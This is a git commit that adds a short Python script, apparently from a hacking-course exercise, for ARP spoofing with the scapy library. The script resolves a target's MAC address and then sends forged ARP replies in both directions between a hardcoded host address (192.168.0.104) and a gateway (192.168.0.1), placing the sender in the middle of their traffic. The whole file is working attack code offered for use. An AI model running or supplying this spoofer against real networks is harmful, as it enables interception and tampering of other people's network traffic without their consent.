756d35061f0179b65924425299790a604eca9379
root <root@localhost.localdomain>
2019-06-09 15:45:27 -0400

    ARP SPOOF

---
+++ arp-spoofing/arp_spoof.py
@@ -0,0 +1,20 @@
+#!/usr/bin/env python
+import scapy.all as scapy
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst = ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answererd_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
+    return( answererd_list[0][1].hwsrc)
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    print(packet.summary())
+    scapy.send(packet)
+
+if __name__ == "__main__":
+    spoof("192.168.0.104","192.168.0.1")
+    spoof("192.168.0.1","192.168.0.104")
